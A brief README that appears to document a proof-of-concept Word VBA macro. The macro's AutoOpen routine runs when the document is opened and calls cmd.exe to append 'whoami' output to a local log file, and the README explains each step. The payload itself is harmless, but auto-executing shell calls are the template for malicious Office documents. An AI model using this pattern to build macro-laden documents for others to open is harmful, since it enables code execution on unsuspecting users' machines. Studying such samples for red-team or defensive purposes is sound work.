# whoami

Runs `whoami` and sends output to `whoami_log.txt` (hard-coded file name).

## Visual Basic Code

```
Sub AutoOpen()
EZ
End Sub

Public Function EZ() As Variant
    Call Shell("cmd.exe /c whoami >> whoami_log.txt", 4)
End Function
```

### Code Explanation

The `Sub AutoOpen()` function runs `EZ` automatically when the document is
opened. This behavior is likely to be blocked by endpoint security software.

The `Shell()` function call calls cmd.exe to run `whoami`, and redirects
the output to `whoami_log.txt` in the current working directory.

Using `Shell()` to call a specific shell like cmd or Powershell is
preferable to trying to use commands within `Shell()` itself.

## References

* [Office VBA Reference - Auto Macros](https://docs.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros)
* [Office VBA Reference - Shell function](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function)